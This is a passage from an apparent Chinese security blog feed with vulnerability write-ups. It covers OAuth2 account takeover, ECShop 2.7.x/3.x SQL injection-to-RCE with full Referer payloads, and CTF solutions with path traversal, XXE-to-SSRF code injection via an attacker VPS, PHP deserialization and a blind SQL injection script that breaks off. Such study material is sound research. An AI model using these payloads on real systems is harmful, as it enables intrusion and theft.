code后拼接到redirect_uri再请求，这点可以在返回包中的Location看到。</p><p>漏洞思路就是redict_uri限制不到位，严重的情况是没有限制域，一般情况是redict_uri可以到子域。QQ做了限制，拿cline_id和redirec_uri比对，不相符就返回False，如下<br><img src="https://i.loli.net/2019/02/14/5c64d712c68d7.png" alt></p><h3 id="案例-第三方帐号快捷登录授权劫持漏洞"><a href="#案例-第三方帐号快捷登录授权劫持漏洞" class="headerlink" title="案例-第三方帐号快捷登录授权劫持漏洞"></a>案例-第三方帐号快捷登录授权劫持漏洞</h3><p>修改redirect_uri到子域(一般是论坛站点，可以加载外域图片的地方，或者是可以XSS的地方)。location跳转到子域后访问我们外域地址，referer就携带了code。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>KEY：<a href="https://gh0st.cn/archives/2018-02-12/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-02-12/1</a></p><h2 id="无state导致CSRF产生的账户接管"><a href="#无state导致CSRF产生的账户接管" class="headerlink" title="无state导致CSRF产生的账户接管"></a>无state导致CSRF产生的账户接管</h2><p>用户在第三方网站A上登录后，通过Authorization code方式的绑定流程。</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>拿绑定QQ为例子。</p><p>一般在登陆后的个人中心页面有绑定社交用户的功能，依然是请求greph.qq.com获取code，拼接到redirect_uri访问后完成绑定。如果没有state参数，用户在A登陆后进行，点击攻击者的redict_uri+code链接，就把用户A绑定在了攻击者的QQ上。可以看作是CSRF<br><img src="https://i.loli.net/2019/02/14/5c64d712f1b50.png" alt></p><h3 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h3><p>OAuth2.0忽略state参数引发的CSRF漏洞：<a href="https://blog.csdn.net/gjb724332682/article/details/54428808" target="_blank" rel="noopener">https://blog.csdn.net/gjb724332682/article/details/54428808</a></p><p>Oauth配置错误导致的账户接管：<a href="https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Oauth2的两类漏洞挖掘&quot;&gt;&lt;a href=&quot;#Oauth2的两类漏洞挖掘&quot; class=&quot;headerlink&quot; title=&quot;Oauth2的两类漏洞挖掘&quot;&gt;&lt;/a&gt;Oauth2的两类漏洞挖掘&lt;/h1&gt;&lt;p&gt;一直忘了总结这个，结合OPPX的网站(无漏洞站点)说
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Echsop2.7.x几处漏洞分析</title>
    <link href="https://hpdoger.cn/2019/02/02/Echsop2.7.x%E5%87%A0%E5%A4%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2019/02/02/Echsop2.7.x几处漏洞分析/</id>
    <published>2019-02-01T16:00:00.000Z</published>
    <updated>2019-02-12T07:04:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Echsop2-7-x几处漏洞分析"><a href="#Echsop2-7-x几处漏洞分析" class="headerlink" title="Echsop2.7.x几处漏洞分析"></a>Echsop2.7.x几处漏洞分析</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这些洞是在半年前公布的细节，当时没来得及关注。最近在给自己定目标，决定重新刷一遍这些洞。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>由于未对Reffer内容进行过滤而造成的SQL注入</p><p>漏洞位置user.php:302</p><pre><code>elseif ($action == &#39;login&#39;){    if (empty($back_act))    {        if (empty($back_act) &amp;&amp; isset($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]))        {            $back_act = strpos($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;], &#39;user.php&#39;) ? &#39;./index.php&#39; : $GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;];        }        else        {            $back_act = &#39;user.php&#39;;        }    }    $smarty-&gt;assign(&#39;back_act&#39;, $back_act);    $smarty-&gt;display(&#39;user_passport.dwt&#39;);}</code></pre><p>$back_act可控为Reffer值，跟进assign</p><pre><code>/** * 注册变量 * * @access  public * @param   mix      $tpl_var * @param   mix      $value * * @return  void */function assign($tpl_var, $value = &#39;&#39;){    if (is_array($tpl_var))    {        foreach ($tpl_var AS $key =&gt; $val)        {            if ($key != &#39;&#39;)            {                $this-&gt;_var[$key] = $val;            }        }    }    else    {        if ($tpl_var != &#39;&#39;)        {            $this-&gt;_var[$tpl_var] = $value;        }    }}</code></pre><p>assign()注册了模板变量$this-&gt;_var[‘back_act’]，这里注册的变量在后面的页面模板编译中会用到</p><p>继续跟进user的display函数</p><pre><code>/** * 显示页面函数 * * @access  public * @param   string      $filename * @param   sting      $cache_id * * @return  void */function display($filename, $cache_id = &#39;&#39;){    error_reporting(E_ALL ^ E_NOTICE);    $out = $this-&gt;fetch($filename, $cache_id);    if (strpos($out, $this-&gt;_echash) !== false)    {        $k = explode($this-&gt;_echash, $out);        foreach ($k AS $key =&gt; $val)        {            if (($key % 2) == 1)            {                $k[$key] = $this-&gt;insert_mod($val);            }        }        $out = implode(&#39;&#39;, $k);    }    echo $out;}</code></pre><p>Display中调用fetch函数处理模板文件：user_passport.dwt，跟进关键代码</p><pre><code>/** * 处理模板文件 * * @access  public * @param   string      $filename * @param   sting      $cache_id * * @return  sring */function fetch($filename, $cache_id = &#39;&#39;){    ...    $out = $this-&gt;make_compiled($filename);    ...    return $out; // 返回html数据}</code></pre><p>$filename就是user_passport.dwt，关键内容如下</p><pre><code>&lt;tr&gt;&lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;act_login&quot; /&gt;  &lt;input type=&quot;hidden&quot; name=&quot;back_act&quot; value=&quot;{$back_act}&quot; /&gt;  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;{$lang.confirm_login}&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;</code></pre><p>通过make_compiled函数编译模板文件，编译时会把之前注册的模板变量渲染到{$back_act}。$out即为渲染后的html代码块</p><p>继续跟进流程，回到display。$out内容被分割为两部分，分割依据是$this-&gt;_echash，而$this-&gt;_echash参数值固定<br><img src="https://i.loli.net/2019/02/01/5c546878d638b.png" alt></p><pre><code>$k = explode($this-&gt;_echash, $out);foreach ($k AS $key =&gt; $val){    if (($key % 2) == 1)    {        $k[$key] = $this-&gt;insert_mod($val);    }}</code></pre><p>跟进insert_mod</p><pre><code>function insert_mod($name) // 处理动态内容{    list($fun, $para) = explode(&#39;|&#39;, $name);    $para = unserialize($para);    $fun = &#39;insert_&#39; . $fun;    return $fun($para);}</code></pre><p>继续对$out内容以“|”形式分割成$fun、$para，|后的内容进行反序列化，再动态调用$fun函数。至此，函数名$fun可控，函数内容$para可控，找一个以Insert_开头的可利用的函数</p><pre><code>function insert_ads($arr){    static $static_res = NULL;    $time = gmtime();    if (!empty($arr[&#39;num&#39;]) &amp;&amp; $arr[&#39;num&#39;] != 1)    {        $sql  = &#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#39; .                    &#39;p.ad_height, p.position_style, RAND() AS rnd &#39; .                &#39;FROM &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad&#39;) . &#39; AS a &#39;.                &#39;LEFT JOIN &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad_position&#39;) . &#39; AS p ON a.position_id = p.position_id &#39; .                &quot;WHERE enabled = 1 AND start_time &lt;= &#39;&quot; . $time . &quot;&#39; AND end_time &gt;= &#39;&quot; . $time . &quot;&#39; &quot;.                    &quot;AND a.position_id = &#39;&quot; . $arr[&#39;id&#39;] . &quot;&#39; &quot; .                &#39;ORDER BY rnd LIMIT &#39; . $arr[&#39;num&#39;];        $res = $GLOBALS[&#39;db&#39;]-&gt;GetAll($sql);    }</code></pre><p>触发SQL注入，构造的PAYLOAD形式：</p><pre><code>echash+ads|serialize(array(&quot;num&quot;=&gt;sqlpayload,&quot;id&quot;=&gt;1))</code></pre><p>创宇提供的一个payload示例如下：</p><pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code></pre><p>采用limit注入，利用procedure analyse函数。具体见P师傅文章：<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p><h1 id="RCE分析"><a href="#RCE分析" class="headerlink" title="RCE分析"></a>RCE分析</h1><p>RCE利用点还是insert_ads函数，参数的处理流程很大一部分是上文SQL注入的流程，这里分析3.x版本的RCE</p><p>继续跟进ads函数，重点部分代码如下：</p><pre><code>function insert_ads($arr){    foreach ($res AS $row)    {        if ($row[&#39;position_id&#39;] != $arr[&#39;id&#39;])        {            continue;        }        $position_style = $row[&#39;position_style&#39;];        ...    }    $position_style = &#39;str:&#39; . $position_style;    $GLOBALS[&#39;smarty&#39;]-&gt;assign(&#39;ads&#39;, $ads);    $val = $GLOBALS[&#39;smarty&#39;]-&gt;fetch($position_style);}</code></pre><p>$res为查询结果，即$row[‘position_id’]可用SQL注入的Union select控制，$arr[‘id’]也可控，当两者相等时$position_style的值就可控为$row[‘position_style’]。接着又调用assgin注册变量、fetch编译模板。再看fetch函数</p><pre><code>/**     * 处理模板文件     *     * @access  public     * @param   string      $filename     * @param   sting      $cache_id     *     * @return  sring     */function fetch($filename, $cache_id = &#39;&#39;){    if (strncmp($filename,&#39;str:&#39;, 4) == 0)    {        $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4)));    }    else    {         ......</code></pre><p>由于字符串前被拼接了str:，所以进入$this-&gt;_eval函数处理，这也是最终的漏洞触发点，可以eval我们构造的恶意语句。<br><img src="https://i.loli.net/2019/02/01/5c5468790d352.png" alt></p><p>但是再_eval之前经过fetch_str处理字符串，跟进</p><pre><code>    /**     * 处理字符串函数     *     * @access  public     * @param   string     $source     *     * @return  sring     */    function fetch_str($source)    {        if (!defined(&#39;ECS_ADMIN&#39;))        {            $source = $this-&gt;smarty_prefilter_preCompile($source);        }        $source=preg_replace(&quot;/([^a-zA-Z0-9_]{1,1})+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is&quot;, &quot;&quot;, $source);        if(preg_match_all(&#39;~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\&quot;\&#39;]?php[\&quot;\&#39;]?)~is&#39;, $source, $sp_match))        {            $sp_match[1] = array_unique($sp_match[1]);            for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)            {                $source = str_replace($sp_match[1][$curr_sp],&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;,$source);            }             for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)            {                 $source= str_replace(&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;, &#39;&lt;?php echo \&#39;&#39;.str_replace(&quot;&#39;&quot;, &quot;\&#39;&quot;, $sp_match[1][$curr_sp]).&#39;\&#39;; ?&gt;&#39;.&quot;\n&quot;, $source);            }         }         return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, $source);    }</code></pre><p>第一个正则会匹配危险的字符串函数，重点在最后一个正则。\\1是替代表达，匹配到的字符串会替代\\1的位置。</p><p>eg:<code>return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, &quot;xxx{abc}xxx&quot;);</code>结果就是<code>return $this-&gt;select(&#39;{abc}&#39;)</code></p><p>跟进select函数</p><pre><code>/** * 处理{}标签 * * @access  public * @param   string      $tag * * @return  sring */function select($tag){    $tag = stripslashes(trim($tag));    if (empty($tag))    {        return &#39;{}&#39;;    }    elseif ($tag{0} == &#39;*&#39; &amp;&amp; substr($tag, -1) == &#39;*&#39;) // 注释部分    {        return &#39;&#39;;    }    elseif ($tag{0} == &#39;$&#39;) // 变量    {//            if(strpos($tag,&quot;&#39;&quot;) || strpos($tag,&quot;]&quot;))//            {//                 return &#39;&#39;;//            }        return &#39;&lt;?php echo &#39; . $this-&gt;get_val(substr($tag, 1)) . &#39;; ?&gt;&#39;;    }    ......</code></pre><p>trim处理了字符串两边的{}，最后返回一段php标签下的字符串，如果成功返回，则之前的eval就可以执行这段php字符串。不过这个值的获取取决于get_val，跟进get_val</p><pre><code>/** * 处理smarty标签中的变量标签 * * @access  public * @param   string     $val * * @return  bool */function get_val($val){    if (strrpos($val, &#39;[&#39;) !== false)    {        $val = preg_replace(&quot;/\[([^\[\]]*)\]/eis&quot;, &quot;&#39;.&#39;.str_replace(&#39;$&#39;,&#39;\$&#39;,&#39;\\1&#39;)&quot;, $val);    }    if (strrpos($val, &#39;|&#39;) !== false)    {        $moddb = explode(&#39;|&#39;, $val);        $val = array_shift($moddb);    }    if (empty($val))    {        return &#39;&#39;;    }    if (strpos($val, &#39;.$&#39;) !== false)    {        $all = explode(&#39;.$&#39;, $val);        foreach ($all AS $key =&gt; $val)        {            $all[$key] = $key == 0 ? $this-&gt;make_var($val) : &#39;[&#39;. $this-&gt;make_var($val) . &#39;]&#39;;        }        $p = implode(&#39;&#39;, $all);    }    else    {        $p = $this-&gt;make_var($val);    }</code></pre><p>若$val不存在<code>.$</code>则进入make_var()</p><pre><code>/** * 处理去掉$的字符串 * * @access  public * @param   string     $val * * @return  bool */function make_var($val){    if (strrpos($val, &#39;.&#39;) === false)    {        if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val]))        {            $val = $this-&gt;_patchstack[$val];        }        $p = &#39;$this-&gt;_var[\&#39;&#39; . $val . &#39;\&#39;]&#39;;    }    else    {       .....</code></pre><p>这个make_var的$val可控，则表明返回的$p可控，最终返回的$this-&gt;get_val()就可控，也就是$this-&gt;_eval的实参可控（一段PHP标签下的字符串），从而getshell。</p><p>构造Payload我用逆推的思路，逐步满足每个函数判断的条件<br><img src="https://i.loli.net/2019/02/02/5c54fa8f5fb8b.png" alt></p><p>最终的POC要结合SQL注入，通过id和num参数将order by注释<br><img src="https://i.loli.net/2019/02/02/5c54fa8f75fb6.png" alt></p><p>再利用union select构造指定列的值：第二列postion_id，第七列position_style<br><img src="https://images.seebug.org/content/images/2018/09/cd7f6796-c175-46c0-a7c4-9cdb480ab960.png-w331s" alt></p><pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&#39; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca</code></pre><p>id的值就是<code>&#39; /*</code>，num的值<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>，0x27202f2a是<code>&#39; /*</code>的16进制值，也就是第二列<code>$row[&#39;position_id&#39;]</code>的值<code>。0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>为<code>{$&#39;];phpinfo/**/();//}</code>的16进制值</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>看到ecshop4/ecshop/includes/lib_insert.php<br><img src="https://images.seebug.org/content/images/2018/09/d542c73a-d3ef-4e89-8394-aa85c7f1332e.png-w331s" alt></p><p>对id和num进行强制类型转换了，字符串无法利用</p><h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>创宇WAF拦截的Payload是这样</p><pre><code>{$abc&#39;];assert(base64_decode(&#39;YXNzZXJ0KCRfR0VUWyd4J10pOw==&#39;));//}</code></pre><p>巧妙解决了$_GET[]的[]问题，测试用法</p><p><img src="https://i.loli.net/2019/02/02/5c55aa16d0c98.png" alt></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://paper.seebug.org/695/#_5" target="_blank" rel="noopener">https://paper.seebug.org/695/#_5</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Echsop2-7-x几处漏洞分析&quot;&gt;&lt;a href=&quot;#Echsop2-7-x几处漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;Echsop2.7.x几处漏洞分析&quot;&gt;&lt;/a&gt;Echsop2.7.x几处漏洞分析&lt;/h1&gt;&lt;h1 id=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>FireShellCTF2019 Bad Injections解题记录</title>
    <link href="https://hpdoger.cn/2019/01/30/FireShellCTF2019%20Bad%20Injections%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hpdoger.cn/2019/01/30/FireShellCTF2019 Bad Injections解题记录/</id>
    <published>2019-01-29T16:00:00.000Z</published>
    <updated>2019-01-30T15:07:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FireShellCTF2019-Bad-Injections解题记录"><a href="#FireShellCTF2019-Bad-Injections解题记录" class="headerlink" title="FireShellCTF2019 Bad Injections解题记录"></a>FireShellCTF2019 Bad Injections解题记录</h1><p>原文投稿安全客：<a href="https://www.anquanke.com/post/id/170381" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170381</a></p><p>题目名称：Bad Injections</p><p>题目地址：<a href="http://68.183.31.62:94" target="_blank" rel="noopener">http://68.183.31.62:94</a></p><p>貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下</p><p>主页面有四个功能，纯静态页面。右键about页面源码信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7566b0a62.png" alt></p><p>给个本地web目录</p><p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p><p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p><pre><code>68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</code></pre><p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p><p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p><p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p><p>down一下download的源码，顺便fuzz一下Controllers的文件</p><pre><code>68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</code></pre><p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p><p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p><p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p><pre><code>68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</code></pre><p>/app/index.php</p><pre><code>&lt;?phpini_set(&#39;display_errors&#39;,1);ini_set(&#39;display_startup_erros&#39;,1);error_reporting(E_ALL);require_once(&#39;Routes.php&#39;);function __autoload($class_name){  if(file_exists(&#39;./classes/&#39;.$class_name.&#39;.php&#39;)){    require_once &#39;./classes/&#39;.$class_name.&#39;.php&#39;;  }else if(file_exists(&#39;./Controllers/&#39;.$class_name.&#39;.php&#39;)){    require_once &#39;./Controllers/&#39;.$class_name.&#39;.php&#39;;  }}</code></pre><p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p><pre><code>&lt;?phpRoute::set(&#39;index.php&#39;,function(){  Index::createView(&#39;Index&#39;);});Route::set(&#39;index&#39;,function(){  Index::createView(&#39;Index&#39;);});Route::set(&#39;about-us&#39;,function(){  AboutUs::createView(&#39;AboutUs&#39;);});Route::set(&#39;contact-us&#39;,function(){  ContactUs::createView(&#39;ContactUs&#39;);});Route::set(&#39;list&#39;,function(){  ContactUs::createView(&#39;Lista&#39;);});Route::set(&#39;verify&#39;,function(){     if(!isset($_GET[&#39;file&#39;]) &amp;&amp; !isset($_GET[&#39;hash&#39;])){    Verify::createView(&#39;Verify&#39;);  }else{    Verify::verifyFile($_GET[&#39;file&#39;],$_GET[&#39;hash&#39;]);  //设置session，file和hash对应请求文件  }});Route::set(&#39;download&#39;,function(){  if(isset($_REQUEST[&#39;file&#39;]) &amp;&amp; isset($_REQUEST[&#39;hash&#39;])){    echo Download::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);  }else{    echo &#39;jdas&#39;;  }});Route::set(&#39;verify/download&#39;,function(){  Verify::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);});Route::set(&#39;custom&#39;,function(){  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);  $data = stream_get_contents($handler); // xml  if(strlen($data) &gt; 1){    Custom::Test($data);  }else{    Custom::createView(&#39;Custom&#39;);  }});Route::set(&#39;admin&#39;,function(){  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){    Admin::createView(&#39;Admin&#39;);  }else{    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);    }else{     echo &quot;;(&quot;;    }  }});Route::set(&#39;custom/sort&#39;,function(){  Custom::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);});Route::set(&#39;index&#39;,function(){ Index::createView(&#39;Index&#39;);});</code></pre><p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p><pre><code>Route::set(&#39;admin&#39;,function(){  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){    Admin::createView(&#39;Admin&#39;);  }else{    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);    }else{     echo &quot;;(&quot;;    }  }});</code></pre><p>找一下其他利用，再看Custom</p><pre><code>Route::set(&#39;custom&#39;,function(){  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);  $data = stream_get_contents($handler);   if(strlen($data) &gt; 1){    Custom::Test($data);  }else{    Custom::createView(&#39;Custom&#39;);  }});</code></pre><p>Custom::Test</p><pre><code>class Custom extends Controller{  public static function Test($string){      $root = simplexml_load_string($string,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);      $test = $root-&gt;name;      echo $test;  }}</code></pre><p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p><p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p><p>poc:</p><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;&lt;note&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p><p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p><p><code>http://vps/xxe.txt</code></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;root&gt;&lt;channel&gt;&lt;item&gt;&lt;link&gt;@hpdoger.me&lt;/link&gt;&lt;/item&gt;&lt;item&gt;&lt;link&gt;@souhu.com&lt;/link&gt;&lt;/item&gt;&lt;/channel&gt;&lt;/root&gt;</code></pre><p><code>POC</code></p><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;&lt;note&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;FireShellCTF2019-Bad-Injections解题记录&quot;&gt;&lt;a href=&quot;#FireShellCTF2019-Bad-Injections解题记录&quot; class=&quot;headerlink&quot; title=&quot;FireShellCTF2019 Bad I
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯月赛19新年场WriteUp</title>
    <link href="https://hpdoger.cn/2019/01/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9B19%E6%96%B0%E5%B9%B4%E5%9C%BAWriteUp/"/>
    <id>https://hpdoger.cn/2019/01/26/安恒杯月赛19新年场WriteUp/</id>
    <published>2019-01-25T16:00:00.000Z</published>
    <updated>2019-01-26T12:49:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒杯月赛19新年场WriteUp"><a href="#安恒杯月赛19新年场WriteUp" class="headerlink" title="安恒杯月赛19新年场WriteUp"></a>安恒杯月赛19新年场WriteUp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>题目代码</p><pre><code>&lt;?php  @error_reporting(1); include &#39;flag.php&#39;;class baby {       protected $skyobj;      public $aaa;    public $bbb;    function __construct()     {              $this-&gt;skyobj = new sec;    }      function __toString()          {                  if (isset($this-&gt;skyobj))              return $this-&gt;skyobj-&gt;read();          }  }  class cool {        public $filename;         public $nice;    public $amzing;     function read()          {           $this-&gt;nice = unserialize($this-&gt;amzing);        $this-&gt;nice-&gt;aaa = $sth;        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)        {            $file = &quot;./{$this-&gt;filename}&quot;;                    if (file_get_contents($file))                     {                              return file_get_contents($file);             }              else             {                 return &quot;you must be joking!&quot;;             }            }    }  }  class sec {      function read()         {                  return &quot;it&#39;s so sec~~&quot;;          }  }  if (isset($_GET[&#39;data&#39;]))  {     $Input_data = unserialize($_GET[&#39;data&#39;]);    echo $Input_data; } else {     highlight_file(&quot;./index.php&quot;); } ?&gt;</code></pre><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>考点一：echo可以调用toString()函数用来返回flag.php内容</p><p>考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str</p><p>考点三：unserialize()不会执行<strong>construct，外部不可控protected变量skyobj，但是序列化时可以放到</strong>construct内部控制</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>class baby {       protected $skyobj;      function __construct()     {          $this-&gt;skyobj = new cool;    $this-&gt;skyobj-&gt;amzing = serialize(new sec);    $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;;    }  }class sec {    function read(){}}class cool {     public $filename;         public $nice;    public $amzing; }$test = new baby();echo urlencode(serialize($test));</code></pre><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>约束攻击登陆admin</p><p>登陆后盲注</p><p>EXP</p><pre><code>#!/usr/bin/env python# encoding: utf-8import requestsimport timedef login(payload):    url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload)    # print &quot;[+] %s&quot; % (url)    before_time = time.time()    cookies = {&#39;PHPSESSID&#39;: &#39;3kus5jrhoqav8te0kf74hglii7&#39;}    response = requests.get(url, cookies=cookies)    # content = response.content    after_time = time.time()    offset = after_time - before_time    # print &quot;[*] Offset : %f&quot; % (offset)    if offset &gt; 2.5:        return True    else:        return Falsedef main():    data = &quot;&quot;    charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    for i in range(1, 40, 1):        for j in charaters:            payload = 